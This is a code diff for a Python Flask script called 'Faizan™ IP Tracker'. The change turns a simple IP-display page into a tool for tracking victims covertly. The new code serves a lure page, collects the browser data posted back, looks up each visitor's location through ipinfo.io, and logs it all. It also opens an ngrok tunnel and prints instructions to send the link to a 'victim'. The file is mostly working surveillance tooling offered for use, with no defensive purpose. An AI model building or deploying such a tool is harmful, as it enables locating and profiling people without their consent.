@@ -1,49 +1,76 @@
-from flask import Flask, request, render_template_string
-import datetime
 import os
+import json
+import time
+import requests
+from flask import Flask, request, render_template
+from threading import Thread
+import subprocess
+from colorama import Fore, Style, init
+
+init(autoreset=True)
 
 app = Flask(__name__)
 
-# Interface with coloring and Faizan's name
-html_template = """
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Faizan™ IP Tracker</title>
-    <style>
-        body { background-color: #0f0f0f; color: #00ff99; font-family: monospace; text-align: center; padding: 20px; }
-        h1 { color: #00ffff; }
-        .info { border: 1px solid #00ff99; padding: 10px; margin: 20px auto; width: 90%; max-width: 600px; background: #1a1a1a; border-radius: 8px; }
-    </style>
-</head>
-<body>
-    <h1>Faizan™ IP Tracker</h1>
-    <p>Welcome to Faizan's Ethical IP Tracking Tool.</p>
-    <div class="info">
-        <h2>📍 Your Info:</h2>
-        <p><strong>IP Address:</strong> {{ ip }}</p>
-        <p><strong>User-Agent:</strong> {{ ua }}</p>
-        <p><strong>Date/Time:</strong> {{ time }}</p>
-    </div>
-</body>
-</html>
-"""
+# Save logs
+LOG_FILE = "logs/captured.txt"
+os.makedirs("logs", exist_ok=True)
 
-# Save to logs
-def save_log(ip, ua):
-    log_dir = "logs"
-    os.makedirs(log_dir, exist_ok=True)
-    with open(f"{log_dir}/victim_log.txt", "a") as f:
-        f.write(f"[{datetime.datetime.now()}] IP: {ip} | UA: {ua}\n")
-
-@app.route("/")
+# HTML page to serve to victim
+@app.route('/')
 def index():
-    ip = request.remote_addr
-    ua = request.headers.get('User-Agent')
-    time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    save_log(ip, ua)
-    return render_template_string(html_template, ip=ip, ua=ua, time=time)
+    return render_template('index.html')
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+# Route to collect info
+@app.route('/log', methods=['POST'])
+def log():
+    data = request.get_json()
+    ip = request.remote_addr
+    user_agent = request.headers.get('User-Agent')
+
+    # GeoIP info
+    try:
+        geo = requests.get(f"https://ipinfo.io/{ip}/json").json()
+    except:
+        geo = {}
+
+    log_entry = {
+        'IP': ip,
+        'User-Agent': user_agent,
+        'Geo': geo,
+        'Client': data
+    }
+
+    with open(LOG_FILE, 'a') as f:
+        f.write(json.dumps(log_entry, indent=4) + '\n')
+
+    print(Fore.GREEN + f"\n[+] Victim Info Captured!")
+    print(Fore.CYAN + f"IP: {ip}")
+    print(Fore.YELLOW + f"Agent: {user_agent}")
+    print(Fore.MAGENTA + f"Location: {geo.get('city')}, {geo.get('region')} ({geo.get('country')})")
+    print(Fore.WHITE + "="*50)
+    return 'OK'
+
+def start_ngrok():
+    os.system("pkill ngrok")
+    time.sleep(1)
+    thread = Thread(target=lambda: os.system("ngrok http 5000 > /dev/null 2>&1"))
+    thread.start()
+    time.sleep(3)
+    try:
+        url = requests.get("http://127.0.0.1:4040/api/tunnels").json()['tunnels'][0]['public_url']
+        print(Fore.LIGHTBLUE_EX + f"\n[+] Ngrok Link: {url}")
+        print(Fore.LIGHTYELLOW_EX + "[!] Send this link to victim")
+    except:
+        print(Fore.RED + "[!] Ngrok URL fetch failed")
+
+if __name__ == '__main__':
+    print(Fore.LIGHTGREEN_EX + """
+
+    ╔═══════════════════════════════════════════╗
+    ║       Faizan™ IP Tracker v3.0 - @HACKER_189     ║
+    ╚═══════════════════════════════════════════╝
+    """ + Style.RESET_ALL)
+
+    print(Fore.WHITE + "[+] Starting server on http://127.0.0.1:5000")
+    Thread(target=start_ngrok).start()
+    app.run(host='0.0.0.0', port=5000)
